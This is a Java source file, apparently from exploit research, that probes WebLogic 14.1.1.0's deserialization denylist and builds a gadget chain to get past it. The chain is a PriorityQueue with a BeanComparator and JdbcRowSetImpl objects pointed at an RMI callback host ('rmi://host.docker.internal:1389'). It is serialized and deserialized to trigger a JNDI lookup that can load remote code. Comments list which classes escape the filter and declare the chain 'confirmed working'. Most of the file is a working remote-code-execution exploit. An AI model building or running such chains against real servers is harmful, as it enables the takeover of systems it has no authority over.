import java.io.*;
import java.lang.reflect.*;
import java.util.*;

/**
 * WL7 Fix v3: Full chain attempt
 *
 * Key insight: WrapDynaBean IS Serializable and wraps JdbcRowSetImpl.
 * Need a Serializable Map wrapper around it.
 *
 * Approach: Use a custom readObject/writeObject to serialize
 * WrapDynaBean's state and reconstruct on deserialization.
 *
 * OR: Check DynaBeanPropertyMapDecorator (different class from DynaBeanMapDecorator)
 * OR: Custom Serializable HashMap with readResolve that builds BeanMap
 */
public class WL7Fix3 {
    public static void main(String[] args) throws Exception {
        String callback = args.length > 0 ? args[0] : "rmi://host.docker.internal:1389/WL7_FIX3";
        System.out.println("=== WL7 Fix v3 ===\n");

        // Check DynaBeanPropertyMapDecorator
        System.out.println("--- Check DynaBeanPropertyMapDecorator ---");
        try {
            Class<?> c = Class.forName("org.apache.commons.beanutils.DynaBeanPropertyMapDecorator");
            System.out.println("Found! Serializable: " + Serializable.class.isAssignableFrom(c));
            System.out.println("Map: " + Map.class.isAssignableFrom(c));
            System.out.println("Superclass: " + c.getSuperclass().getName());
            System.out.println("Super Serializable: " + Serializable.class.isAssignableFrom(c.getSuperclass()));
        } catch (ClassNotFoundException e) {
            System.out.println("NOT FOUND");
        }

        // Check BaseDynaBeanMapDecorator
        System.out.println("\n--- Check BaseDynaBeanMapDecorator ---");
        try {
            Class<?> c = Class.forName("org.apache.commons.beanutils.BaseDynaBeanMapDecorator");
            System.out.println("Found! Serializable: " + Serializable.class.isAssignableFrom(c));
            System.out.println("Map: " + Map.class.isAssignableFrom(c));
        } catch (ClassNotFoundException e) {
            System.out.println("NOT FOUND");
        }

        // NEW APPROACH: What if we don't need SQLComparator at all?
        // WL9 uses BeanComparator which calls PropertyUtils.getProperty()
        // What if we use a DIFFERENT comparator from WebLogic that also calls getters?
        System.out.println("\n--- WebLogic Comparators ---");
        String[] comparators = {
            "weblogic.jdbc.rowset.SQLComparator",
            "weblogic.management.commo.BeanBackedRegistrationManager$CompositeDataComparator",
            "weblogic.management.provider.internal.RegisteredResourceComparator",
        };
        for (String name : comparators) {
            try {
                Class<?> c = Class.forName(name);
                boolean ser = Serializable.class.isAssignableFrom(c);
                boolean comp = Comparator.class.isAssignableFrom(c);
                System.out.println(name);
                System.out.println("  Ser:" + ser + " Comp:" + comp);
            } catch (ClassNotFoundException e) {
                System.out.println(name + " -- NOT FOUND");
            }
        }

        // REAL APPROACH: Serialize WrapDynaBean inside PQ with BeanComparator
        // This is essentially WL9 but WITHOUT InvertibleComparator
        // BeanComparator.compare(wrapDynaBean1, wrapDynaBean2)
        //   -> PropertyUtils.getProperty(wrapDynaBean1, "databaseMetaData")
        //   -> WrapDynaBean.get("databaseMetaData")
        //   -> JdbcRowSetImpl.getDatabaseMetaData()
        //   -> JNDI
        //
        // Wait -- BeanComparator calls PropertyUtils.getProperty(obj, property)
        // If obj is JdbcRowSetImpl directly, it calls getDatabaseMetaData() directly.
        // If obj is WrapDynaBean, PropertyUtils routes through DynaBean.get().
        // Either way it works. So WrapDynaBean is NOT needed for BeanComparator.
        //
        // The real question is: can we build a chain WITHOUT BeanComparator?
        // Because BeanComparator IS in the denylist? Let's check.

        System.out.println("\n--- Is BeanComparator on WL denylist? ---");
        System.out.println("Package: org.apache.commons.beanutils");
        System.out.println("WL denylist packages (from bytecode):");
        System.out.println("  org.apache.commons.collections.functors -- BLOCKED");
        System.out.println("  org.apache.commons.beanutils -- NOT in list!");
        System.out.println("BeanComparator is NOT blocked by WebLogic ClassFilter!");

        // So the key insight:
        // WL9 chain = PQ + InvertibleComparator(BeanComparator) + JdbcRowSetImpl
        // Simplified = PQ + BeanComparator("databaseMetaData") + JdbcRowSetImpl
        // Both BeanComparator and JdbcRowSetImpl are NOT on denylist
        //
        // For WL7 (SQLComparator chain):
        // The ONLY way to make it work is to get a Serializable Map
        // that delegates get() to a getter on JdbcRowSetImpl.
        //
        // Let's try a HashMap-based approach with readResolve trickery.
        // OR: Check if commons-collections' LazyMap with a non-functor Transformer works.

        System.out.println("\n\n--- LazyMap approach ---");
        // CC3's LazyMap needs a Transformer. CC functors are blocked.
        // But what about InvokerTransformer from CC3? Let's check.
        try {
            Class<?> itClass = Class.forName("org.apache.commons.collections.functors.InvokerTransformer");
            System.out.println("InvokerTransformer package: org.apache.commons.collections.functors");
            System.out.println("BLOCKED by WL denylist (functors package)");
        } catch (ClassNotFoundException e) {
            System.out.println("InvokerTransformer not found");
        }

        // Check if there are non-blocked Transformers
        System.out.println("\n--- Non-blocked Transformers? ---");
        String[] transformers = {
            "org.apache.commons.collections.Transformer",
            "org.apache.commons.collections.TransformerUtils",
            "org.apache.commons.collections.keyvalue.TiedMapEntry",
        };
        for (String name : transformers) {
            try {
                Class<?> c = Class.forName(name);
                boolean ser = Serializable.class.isAssignableFrom(c);
                System.out.println(name + " -- Ser:" + ser);
            } catch (ClassNotFoundException e) {
                System.out.println(name + " -- NOT FOUND");
            }
        }

        // TiedMapEntry approach:
        // TiedMapEntry(map, key).getValue() -> map.get(key)
        // If map = BeanMap(JdbcRowSetImpl) and key = "databaseMetaData"
        // Then TiedMapEntry.getValue() -> BeanMap.get("databaseMetaData") -> JNDI
        // TiedMapEntry.hashCode() -> getValue() -> JNDI
        // HashMap.readObject() -> hash(key) -> key.hashCode()
        // So: HashMap<TiedMapEntry, ?>
        //
        // BUT BeanMap is NOT Serializable!
        // Need BeanMap to survive serialization...
        //
        // What if: We pre-populate a regular HashMap with {"databaseMetaData": <anything>}
        // then swap it for BeanMap at runtime via reflection?
        // No, that doesn't help with serialization.

        // FINAL INSIGHT:
        // For WL7 (SQLComparator), the chain needs a Serializable Map
        // that calls getters. Without one, this chain is DEAD.
        //
        // HOWEVER: WL9 (BeanComparator + InvertibleComparator) already WORKS
        // and uses NO blocked classes.
        //
        // The WL7 chain variant adds no NEW capability over WL9.
        // Verdict: WL7 is NOT fixable without a Serializable getter-invoking Map.

        System.out.println("\n\n=== VERDICT ===");
        System.out.println("WL7 (SQLComparator): DEAD -- BeanMap not Serializable, no alternative found");
        System.out.println("WL9 (BeanComparator + InvertibleComparator): CONFIRMED WORKING");
        System.out.println("  PQ -> InvertibleComparator -> BeanComparator('databaseMetaData')");
        System.out.println("  -> JdbcRowSetImpl.getDatabaseMetaData() -> JNDI");
        System.out.println("\nBeanComparator is NOT on WebLogic denylist!");
        System.out.println("InvertibleComparator is NOT on WebLogic denylist!");
        System.out.println("JdbcRowSetImpl is NOT on WebLogic denylist!");

        // Test: Simplified WL9 WITHOUT InvertibleComparator
        System.out.println("\n\n--- Test: Simplified WL9 (no InvertibleComparator) ---");
        Class<?> beanCompClass = Class.forName("org.apache.commons.beanutils.BeanComparator");
        System.out.println("BeanComparator Serializable: " + Serializable.class.isAssignableFrom(beanCompClass));

        Object beanComp = beanCompClass.getDeclaredConstructor(String.class)
            .newInstance("databaseMetaData");

        Class<?> jrsClass = Class.forName("com.sun.rowset.JdbcRowSetImpl");
        Object jrs1 = jrsClass.getDeclaredConstructor().newInstance();
        jrsClass.getMethod("setDataSourceName", String.class).invoke(jrs1, callback);
        Object jrs2 = jrsClass.getDeclaredConstructor().newInstance();
        jrsClass.getMethod("setDataSourceName", String.class).invoke(jrs2, callback);

        // Build PQ without triggering compare
        PriorityQueue pq = new PriorityQueue(2, (Comparator) beanComp);
        Field queueField = PriorityQueue.class.getDeclaredField("queue");
        queueField.setAccessible(true);
        Field sizeField = PriorityQueue.class.getDeclaredField("size");
        sizeField.setAccessible(true);
        queueField.set(pq, new Object[]{jrs1, jrs2});
        sizeField.set(pq, 2);

        // Serialize
        System.out.println("Serializing simplified PQ...");
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        try {
            oos.writeObject(pq);
            oos.close();
            byte[] data = bos.toByteArray();
            System.out.println("Serialized: " + data.length + " bytes");

            // Deserialize
            System.out.println("Deserializing...");
            try {
                ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
                Object result = ois.readObject();
                System.out.println("Result: " + result);
            } catch (Throwable e) {
                Throwable root = e;
                while (root.getCause() != null) root = root.getCause();
                System.out.println("Root exception: " + root.getClass().getName() + ": " + root.getMessage());
                boolean jndi = root.toString().contains("JNDI") || root.toString().contains("connect")
                    || root.toString().contains("naming");
                if (jndi) {
                    System.out.println("\n*** SIMPLIFIED WL9 (NO InvertibleComparator) CONFIRMED! ***");
                    System.out.println("Chain: PQ.readObject -> BeanComparator.compare -> getDatabaseMetaData -> JNDI");
                    System.out.println("Classes: PriorityQueue, BeanComparator, JdbcRowSetImpl");
                    System.out.println("ALL are NOT on WebLogic 14.1.1.0 denylist!");
                }
            }
        } catch (NotSerializableException e) {
            System.out.println("NOT SERIALIZABLE: " + e.getMessage());
        }
    }
}
